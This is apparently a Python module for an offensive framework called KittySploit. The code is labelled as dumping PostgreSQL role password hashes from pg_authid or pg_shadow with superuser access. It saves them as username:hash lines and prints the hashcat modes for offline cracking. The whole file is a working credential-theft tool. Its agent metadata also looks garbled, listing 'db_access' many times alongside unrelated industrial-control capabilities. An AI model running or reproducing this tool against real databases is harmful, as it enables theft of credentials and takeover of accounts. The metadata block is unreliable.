from kittysploit import *
from lib.protocols.postgresql.postgresql_client import PostgreSQLClient


class Module(Post, PostgreSQLClient):

	__info__ = {
		"name": "Dump PostgreSQL Role Password Hashes",
		"description": (
			"Dump role password hashes from pg_authid/pg_shadow (superuser). "
			"Supports SCRAM-SHA-256 and legacy MD5 hashes for offline cracking"
		),
		"author": "KittySploit Team",
		"session_type": SessionType.POSTGRESQL,
	'agent': {
	    'risk': 'intrusive',
	    'effects': ['active_exploitation'],
	    'expected_requests': 2,
	    'reversible': False,
	    'approval_required': True,
	    'produces': ['risk_signals'],
	    'cost': 1.5,
	    'noise': 0.5,
	    'value': 1.0,
	    'requires': 	    {'min_endpoints': 0,
	     'min_params': 0,
	     'tech_hints_any': [],
	     'tech_hints_all': [],
	     'specializations_any': [],
	     'risk_signals_any': [],
	     'auth_session': False,
	     'capabilities_any': [],
	     'capabilities_all': [],
	     'confidence_min': {},
	     'confidence_min_any': {},
	     'endpoint_pattern_any': [],
	     'param_any': [],
	     'api_surface_ready': False},
	    'chain': 	    {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 's7comm', 'from_detail': ''},
	                               {'capability': 'ot_assets', 'from_detail': ''},
	                               {'capability': 'ot_assets', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''}],
	     'consumes_capabilities': [],
	     'option_bindings': {},
	     'suggested_followups': []},
	},
	}

	include_system = OptBool(False, "Include pg_* internal roles", False)
	login_only = OptBool(True, "Only roles that can login (rolcanlogin)", False)
	output_file = OptString("", "Save hashes to local file (username:hash per line)", False)

	def run(self):
		try:
			if not self.is_superuser():
				raise ProcedureError(
					FailureType.NotAccess,
					"pg_authid / pg_shadow requires superuser",
				)

			rows = self._fetch_hashes()
			if not rows:
				print_warning("No password hashes returned")
				return True

			lines = []
			print_success(f"Dumped {len(rows)} role hash(es):")
			print_info("=" * 80)

			for rolname, rolpassword, validuntil, canlogin in rows:
				if self.login_only and not canlogin:
					continue
				if not self.include_system and str(rolname).startswith("pg_"):
					continue

				hashval = str(rolpassword) if rolpassword else "(null)"
				algo = self._hash_type(hashval)
				print_info(f"  {rolname}")
				print_info(f"    hash: {hashval}")
				print_info(f"    type: {algo} | login={canlogin} | valid_until={validuntil or 'never'}")

				if rolpassword:
					lines.append(f"{rolname}:{hashval}")

			if self.output_file:
				path = str(self.output_file)
				with open(path, "w", encoding="utf-8") as fh:
					fh.write("\n".join(lines) + ("\n" if lines else ""))
				print_success(f"Saved {len(lines)} hash(es) to {path}")
				print_info("Crack SCRAM with hashcat mode 28600; MD5 (postgres) with mode 11100")

			return True
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(
				FailureType.Unknown, f"Role hash dump failed: {exc}"
			)

	def _fetch_hashes(self):
		query = (
			"SELECT rolname, rolpassword, rolvaliduntil, rolcanlogin "
			"FROM pg_authid WHERE rolpassword IS NOT NULL ORDER BY rolname;"
		)
		try:
			return self.execute_query(query)
		except Exception:
			rows = self.execute_query(
				"SELECT usename, passwd, valuntil "
				"FROM pg_shadow WHERE passwd IS NOT NULL ORDER BY usename;"
			)
			return [(u, p, v, True) for u, p, v in rows]

	@staticmethod
	def _hash_type(hashval: str) -> str:
		if hashval.startswith("SCRAM-SHA-256"):
			return "SCRAM-SHA-256"
		if hashval.startswith("md5"):
			return "MD5 (PostgreSQL)"
		if hashval == "(null)":
			return "none"
		return "unknown"
